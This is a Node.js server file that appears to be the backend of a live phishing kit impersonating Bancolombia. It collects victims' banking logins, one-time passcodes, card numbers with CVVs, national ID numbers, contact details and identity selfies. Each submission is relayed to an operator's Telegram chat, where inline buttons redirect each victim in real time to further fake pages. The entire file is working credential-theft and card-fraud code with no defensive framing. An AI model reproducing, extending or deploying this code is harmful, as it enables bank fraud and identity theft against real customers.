// 📦 Backend 

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data'); // ✅ Paquete correcto para Node.js
const app = express();

const corsOptions = {
  origin: '*', 
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
};
app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos.");
}

const redirections = new Map();

const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

app.get('/', (_req, res) => {
  res.send({ ok: true, service: 'virtual-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
});

// ====================================================================================
// 💡 FUNCIONES DE MENÚ REUTILIZABLES
// ====================================================================================

function getPrimaryReplyMarkup(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `go:errorlogo|${sessionId}` },
                { text: "♻️ Pedir Dinamica", callback_data: `go:opcion1|${sessionId}` }
            ],
            [
                { text: "🔒 CVV", callback_data: `go:debit|${sessionId}` },
                { text: "💳 16 CreditCard", callback_data: `go:partcc|${sessionId}` }
            ],
            [
                { text: "📋 Datos", callback_data: `go:datos|${sessionId}` },
                { text: "🌐 SoyYO", callback_data: `go:soyyo|${sessionId}` }
            ],
            [
                { text: "💌 SMS", callback_data: `go:opcion3|${sessionId}` },
                { text: "FINALIZAR✅", callback_data: `go:finalizar|${sessionId}` }
            ],
            [
                { text: "➕ Más Opciones", callback_data: `menu2|${sessionId}` }
            ]
        ]
    };
}

function getSecondaryReplyMarkup(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `go:errorlogo|${sessionId}` },
                { text: "♻️Pédir Dinámica", callback_data: `go:opcion1|${sessionId}` }
            ],
            [
                { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum|${sessionId}` },
                { text: "♻️Pédir Dinámica", callback_data: `go:opcion1|${sessionId}` }
            ],
            [
                { text: "❌ Error CVV", callback_data: `go:debiterror|${sessionId}` },
                { text: "🪙 MasterCard Gold", callback_data: `go:mastergold|${sessionId}` }
            ],
            [
                { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati|${sessionId}` },
                { text: "🖤 Mastercard Black", callback_data: `go:masterblaack|${sessionId}` }
            ],
            [
                { text: "FINALIZAR✅", callback_data: `go:finalizar|${sessionId}` } 
            ]
        ]
    };
}

function getOTPReplyMarkup(sessionId, rutaSiguiente = 'opcion1') {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `go:errorlogo|${sessionId}` },
                { text: "☢️ Error OTP", callback_data: `go:opcion2|${sessionId}` },
            ],
            [
                { text: "💊 SOY YO", callback_data: `go:$soyyo|${sessionId}` },
                { text: "✅ Finalizar", callback_data: `go:finalizar|${sessionId}` }
            ],
            [
                 { text: "➕ Más Opciones", callback_data: `menu2|${sessionId}` } 
            ]
        ]
    };
}

// ================== NUEVA RUTA: /SELFIE ==================
app.post('/selfie', async (req, res) => {
  try {
    const { sessionId, imageBase64, fileName, ip, country, city } = req.body;
    
    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).send({ ok: false, reason: "Env vars undefined" });
    }

    if (!imageBase64) {
      return res.status(400).send({ ok: false, reason: "No image provided" });
    }

    // Convertir base64 a buffer
    const base64Data = imageBase64.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    const caption = `
📸 SELFIE RECIBIDA
📁 Archivo: ${fileName || 'selfie.jpg'}
🌐 IP: ${ip || 'N/D'}
📍 Ubicación: ${city || 'N/D'}, ${country || 'N/D'}
🆔 Session: ${sessionId}
    `.trim();

    // ✅ Usar form-data correctamente para Node.js
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', buffer, {
      filename: fileName || 'selfie.jpg',
      contentType: 'image/jpeg'
    });
    formData.append('caption', caption);
    formData.append('reply_markup', JSON.stringify(getPrimaryReplyMarkup(sessionId)));

    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
      headers: formData.getHeaders()
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /selfie');
    if (error.response) {
      console.error('📄 RESPONSE:', error.response.data);
    }
    console.error('🧠 ERROR:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ================== RUTAS PRINCIPALES ==================

app.post('/virtualpersona', async (req, res) => {
  try {
    const { sessionId, user, pass, ip, country, city } = req.body;
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error("❌ BOT_TOKEN o CHAT_ID no definidos");
      return res.status(500).send({ ok: false, reason: "Env vars undefined" });
    }
    const mensaje = `
💲NUEVO LOGO BANCOLOMBIA X PABLITOX💲
👤 USUARIO: ${user}
🔑 CLAVE: ${pass}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    const reply_markup = getPrimaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /virtualpersona');
    if (error.response) {
      console.error('📄 RESPONSE:', error.response.data);
    }
    console.error('🧠 ERROR:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

app.post('/otp1', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;
    const mensaje = `
💲 Ingreso OTP Dinamica 💲
👤 User: ${user}
🔑 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    redirections.set(sessionId, null);
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /otp1:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/otp2', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;
    const mensaje = `
💲 Ingreso OTP new Dinamica 💲
👤 User: ${user}
🔑 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    redirections.set(sessionId, null);
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion2');
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /otp2:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/otp3', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;
    const mensaje = `
🔴 Ingreso OTP 3
👤 User: ${user}
🔑 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    redirections.set(sessionId, null);
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion3');
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /otp3:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/credito', async (req, res) => {
  try {
    const { sessionId, user, pass, credito, vencimiento, cvv, ip, country, city } = req.body;
    const mensaje = `
💳 Tarjeta de CRÉDITO
👤 User: ${user}
🔑 Pass: ${pass}
💳 Número: ${credito}
📅 Vencimiento: ${vencimiento}
🔐 CVV: ${cvv}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    redirections.set(sessionId, null);
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /credito:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/virtual', async (req, res) => {
  try {
    const { sessionId, user, pass, virtual, vencimiento, cvv, ip, country, city } = req.body;
    const mensaje = `
💳 Tarjeta VIRTUAL
👤 User: ${user}
🔑 Pass: ${pass}
💳 Número: ${virtual}
📅 Vencimiento: ${vencimiento}
🔐 CVV: ${cvv}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    redirections.set(sessionId, null);
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /virtual:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/amex', async (req, res) => {
  try {
    const { sessionId, user, pass, amex, vencimiento, cvv, ip, country, city } = req.body;
    const mensaje = `
💳 Tarjeta AMEX
👤 User: ${user}
🔑 Pass: ${pass}
💳 Número: ${amex}
📅 Vencimiento: ${vencimiento}
🔐 CVV: ${cvv}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    redirections.set(sessionId, null);
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /amex:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/datos', async (req, res) => {
  try {
    const { sessionId, user, pass, nombre, cedula, correo, telefono, ip, country, city } = req.body;
    const mensaje = `
📋 DATOS PERSONALES
👤 User: ${user}
🔑 Pass: ${pass}
📛 Nombre: ${nombre}
🪪 Cédula: ${cedula}
📧 Correo: ${correo}
📱 Teléfono: ${telefono}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    redirections.set(sessionId, null);
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /datos:', error.message);
    res.status(500).send({ ok: false });
  }
});

app.post('/partcc', async (req, res) => {
  try {
    const { sessionId, user, pass, partcc, ip, country, city } = req.body;
    const mensaje = `
💳 16 DÍGITOS TC/DB
👤 User: ${user}
🔑 Pass: ${pass}
💳 16 Dígitos: ${partcc}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();
    redirections.set(sessionId, null);
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });
    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /partcc:', error.message);
    res.status(500).send({ ok: false });
  }
});
app.post('/debit', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 CVV DEBITO
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /debit:', error.message); res.status(500).send({ ok: false }); }
});


app.post('/visaclasica', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 VISA CLÁSICA
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /visaclasica:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/visainfinite', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 VISA INFINITE
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /visainfinite:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/visaplAtinum', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 VISA PLATINUM
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /visaplAtinum:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/visaseleccion', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 VISA SELECCIÓN
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /visaseleccion:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/Visalifemiles', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 VISA LIFEMILES
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /Visalifemiles:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/Mastercardvirtual', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 MASTERCARD VIRTUAL
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /Mastercardvirtual:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/Mastercardgold', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 MASTERCARD GOLD
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /Mastercardgold:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/masterclasica', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 MASTERCARD CLÁSICA
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /masterclasica:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/masterplAtinum', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 MASTERCARD PLATINUM
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /masterplAtinum:', error.message); res.status(500).send({ ok: false }); }
});

app.post('/masterblack', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 MASTERCARD BLACK
👤 Usuario: ${user}
🔑 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();
    const reply_markup = getSecondaryReplyMarkup(sessionId);
    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
    res.send({ ok: true });
  } catch (error) { console.error('Error en /masterblack:', error.message); res.status(500).send({ ok: false }); }
});

// ================== WEBHOOK OPTIMIZADO CON ELIMINACIÓN DE MENÚ ==================
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;
    
    if (callback_query) {
      const [action, sessionId] = (callback_query.data || '').split('|');
      
      // ✅ NUEVA FUNCIONALIDAD: Eliminar menú al presionar cualquier botón
      try {
        await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
          chat_id: callback_query.message.chat.id,
          message_id: callback_query.message.message_id,
          reply_markup: { inline_keyboard: [] } // Vacía los botones
        });
      } catch (editError) {
        console.log('⚠️ No se pudo eliminar el menú (mensaje ya modificado o muy antiguo)');
      }
      
      // ✅ OPTIMIZACIÓN: Mostrar menú 2 DIRECTAMENTE sin POST adicional
      if (action === 'menu2') {
        const mensaje = `
📋 Menú de Tarjetas Adicionales
Selecciona una opción:
        `.trim();
        
        await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
          chat_id: callback_query.message.chat.id,
          message_id: callback_query.message.message_id,
          reply_markup: getSecondaryReplyMarkup(sessionId)
        });
        
        await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
          callback_query_id: callback_query.id,
          text: "Menú adicional cargado ✅"
        });
        
        return res.sendStatus(200);
      }
      
      // Manejo normal de redirección
      const route = action.replace('go:', '');
      const finalRoute = route.endsWith('.html') ? route : `${route}.html`;
      
      if (sessionId) redirections.set(sessionId, finalRoute);
      
      await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
        callback_query_id: callback_query.id,
        text: `Redirigiendo → ${finalRoute}`,
        show_alert: true
      });
    }
    res.sendStatus(200);
  } catch (err) {
    console.error("Error en webhook:", err);
    res.sendStatus(200);
  }
});

app.get('/instruction/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = redirections.get(sessionId);
  if (target) {
    redirections.delete(sessionId);
    res.send({ redirect_to: target });
  } else {
    res.send({});
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));

setInterval(async () => {
  try {
    const res = await fetch("https://pintalaqyolacoloreo.onrender.com"); 
    const text = await res.text();
    console.log("🔄 Auto-ping realizado:", text);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 180000);